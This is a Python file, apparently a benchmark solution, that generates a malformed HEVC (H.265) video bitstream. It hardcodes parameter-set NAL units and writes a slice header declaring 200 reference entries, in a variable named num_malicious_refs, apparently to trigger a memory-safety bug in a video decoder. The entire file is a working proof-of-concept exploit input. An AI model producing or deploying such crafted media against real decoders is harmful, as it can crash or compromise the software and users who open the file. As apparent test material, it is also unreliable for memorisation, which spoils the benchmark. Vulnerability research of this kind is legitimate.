import sys

class Solution:

    class _BitStream:
        def __init__(self):
            self.buffer = bytearray()
            self.current_byte = 0
            self.bits_in_byte = 0

        def write_bit(self, bit: int):
            self.current_byte = (self.current_byte << 1) | (bit & 1)
            self.bits_in_byte += 1
            if self.bits_in_byte == 8:
                self.buffer.append(self.current_byte)
                self.current_byte = 0
                self.bits_in_byte = 0

        def write(self, value: int, num_bits: int):
            for i in range(num_bits - 1, -1, -1):
                bit = (value >> i) & 1
                self.write_bit(bit)

        def write_ue(self, value: int):
            if value == 0:
                self.write_bit(1)
                return
            
            val_plus_1 = value + 1
            num_bits = val_plus_1.bit_length()
            leading_zeros = num_bits - 1
            
            for _ in range(leading_zeros):
                self.write_bit(0)
            
            self.write(val_plus_1, num_bits)

        def write_se(self, value: int):
            if value <= 0:
                uv = -2 * value
            else:
                uv = 2 * value - 1
            self.write_ue(uv)

        def rbsp_trailing_bits(self):
            self.write_bit(1)
            while self.bits_in_byte != 0:
                self.write_bit(0)

        def get_bytes(self) -> bytes:
            if self.bits_in_byte > 0:
                self.buffer.append(self.current_byte << (8 - self.bits_in_byte))
            return bytes(self.buffer)

    def _create_nalu(self, nal_type: int, rbsp: bytes) -> bytes:
        header = bytearray([(nal_type << 1) & 0x7E, 0x01])
        
        nal_payload = bytearray()
        zeros = 0
        for byte in rbsp:
            if zeros == 2 and byte <= 0x03:
                nal_payload.append(0x03)
                zeros = 0
            nal_payload.append(byte)
            if byte == 0x00:
                zeros += 1
            else:
                zeros = 0
                
        return b'\x00\x00\x00\x01' + header + nal_payload

    def solve(self, src_path: str) -> bytes:
        vps_nalu = b'\x00\x00\x00\x01\x40\x01\x0c\x01\xff\xff\x01\x60\x00\x00\x03\x00\xb0\x00\x00\x03\x00\x00\x03\x00\x96\xa0\x02\x80\x80\x2d\x16\x59\x59\xa4\x93\x2b'
        sps_nalu = b'\x00\x00\x00\x01\x42\x01\x01\x01\x60\x00\x00\x03\x00\xb0\x00\x00\x03\x00\x00\x03\x00\x96\xa0\x02\x80\x80\x2d\x16\x59\x59\xa4\x93\x2b'
        pps_nalu = b'\x00\x00\x00\x01\x44\x01\xc1\x73\xc0\x49\x10'

        bs = self._BitStream()

        bs.write(1, 1)
        bs.write_ue(0)
        bs.write_ue(1)
        bs.write(1, 1)
        bs.write(1, 8)
        bs.write(0, 1)
        
        num_malicious_refs = 200
        bs.write_ue(num_malicious_refs)
        bs.write_ue(0)
        
        for _ in range(num_malicious_refs):
            bs.write_ue(0)
            bs.write(1, 1)
        
        bs.write(0, 1)
        bs.write(0, 1)
        bs.write(0, 1)
        bs.write(0, 1)
        bs.write(0, 1)
        bs.write_se(0)
        bs.write(0, 1)
        
        bs.rbsp_trailing_bits()
        
        slice_rbsp = bs.get_bytes()
        slice_nalu = self._create_nalu(1, slice_rbsp)

        return vps_nalu + sps_nalu + pps_nalu + slice_nalu